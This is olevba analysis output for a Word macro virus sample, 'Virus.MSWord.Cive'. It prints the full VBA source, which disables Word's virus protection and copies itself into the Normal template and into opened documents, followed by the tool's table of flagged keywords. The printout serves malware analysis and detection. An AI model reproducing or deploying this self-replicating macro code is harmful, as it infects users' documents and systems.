olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cive
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cive - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
Set oldho = MacroContainer.VBProject: Options.VirusProtection = False
Set oldhos = oldho.vbcomponents(1): Set oldhost = oldhos.codemodule
Set Skip = NormalTemplate: Set newhost = Skip.VBProject.vbcomponents(1).codemodule
vcode = "Sub Document_Close()" & vbCr & oldhost.lines(2, oldhost.countoflines)
If MacroContainer = NormalTemplate Then
Set Skip = ActiveDocument: Set newhost = Skip.VBProject.vbcomponents(1).codemodule
vcode = "Sub Document_Open()" & vbCr & oldhost.lines(2, oldhost.countoflines)
End If
If newhost.countoflines < 5 Then
newhost.addfromstring vcode
Skip.Save
End If
If Day(Now()) = Int(Rnd * 31) + 1 Then MsgBox "Free VicodinES!", 64, "Class.FreeVic"
End Sub

Rem Another virus by Jack Twoflower LineZerØ/Metaphase
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

